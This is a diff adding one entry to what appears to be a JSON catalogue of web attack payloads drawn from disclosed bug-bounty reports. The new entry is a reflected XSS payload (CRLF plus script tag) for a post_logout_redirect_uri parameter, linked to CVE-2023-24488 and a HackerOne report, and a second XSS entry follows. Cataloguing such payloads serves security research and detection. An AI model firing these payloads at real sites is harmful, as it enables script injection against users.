@@ -24650,6 +24650,23 @@
     }
   },
   {
+    "id": "be1ceda9",
+    "class": "xss",
+    "payload": "https://\u2588\u2588\u2588\u2588\u2588/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>",
+    "technique": "Reflected XSS via script injection in the post_logout_redirect_uri parameter",
+    "param": "post_logout_redirect_uri",
+    "report": {
+      "id": 2045549,
+      "url": "https://hackerone.com/reports/2045549",
+      "title": "CVE-2023-24488 xss on https://\u2588\u2588\u2588\u2588\u2588\u2588/",
+      "program": "U.S. Dept Of Defense",
+      "reporter": "0xmaruf",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-09-08"
+    }
+  },
+  {
     "id": "31c4f9d3",
     "class": "xss",
     "payload": "{\"id\":\"4\",\"activationDate\":\"<script>alert(1)</script>\"}",
